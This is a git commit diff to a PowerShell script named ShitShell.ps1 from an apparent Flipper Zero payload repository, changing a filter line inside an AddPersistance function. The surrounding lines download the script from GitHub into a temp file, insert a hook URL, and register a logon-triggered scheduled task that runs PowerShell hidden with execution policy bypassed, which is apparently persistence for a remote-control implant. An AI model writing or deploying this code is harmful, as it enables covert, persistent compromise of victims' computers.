040bbc57f512fa8107a62b79f6877d4c1aec27a6
Neo0412 <94992865+Neo0412@users.noreply.github.com>
2024-03-02 13:44:52 +0100

    Update ShitShell.ps1

--- ShitShell.ps1
+++ ShitShell.ps1
@@ -88,8 +88,7 @@ function AddPersistance {
     "`$bin = `"$bin`"" | Out-File -Append "$env:TEMP\s.ps1" -Force
     (Invoke-WebRequest "https://raw.githubusercontent.com/Neo0412/FlipperScripts/main/ShitShell.ps1").Content | Out-File -Append "$env:TEMP\s.ps1"
 
-    (Get-Content -Path "$env:TEMP\s.ps1" | Where-Object {$_ -notmatch '$hookUrl = "$hk"' -and $_ -notmatch '$bin = "$bn"'}) | Set-Content -Path "$env:TEMP\s.ps1"
-
+    (Get-Content -Path "$env:TEMP\s.ps1" | Where-Object {$_ -notlike '*$hookUrl = "$hk"*' -and $_ -notlike '*$bin = "$bn"*'}) | Set-Content -Path "$env:TEMP\s.ps1"
 
     $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
     $TaskAction = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $env:TEMP\s.ps1"
